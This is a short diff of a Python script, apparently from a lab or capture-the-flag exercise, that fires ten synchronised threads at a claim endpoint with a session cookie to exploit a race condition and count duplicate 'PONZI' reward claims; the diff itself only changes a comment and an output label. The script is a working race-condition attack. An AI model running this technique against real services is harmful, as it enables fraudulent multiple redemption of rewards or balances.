@@ -85,7 +85,7 @@ N = 10
 barrier = threading.Barrier(N)
 
 def claim(i):
-    barrier.wait()  # all threads fire the same instant
+    barrier.wait() 
     try:
         r = requests.post(URL, cookies=COOKIE, timeout=10)
         return (i, r.status_code, r.text.strip())
@@ -99,7 +99,7 @@ ok = 0
 for i, code, body in sorted(results):
     win = (code == 200 and "successfully" in body)
     if win: ok += 1
-    print(f"[{i:02d}] {code} {body[:95]}{' <-- CLAIMED' if win else ''}")
+    print(f"[{i:02d}] {code} {body[:95]}{'Claimed' if win else ''}")
 
 print(f"\nSuccessful claims: {ok} (~{ok*50} PONZI)")
 ```
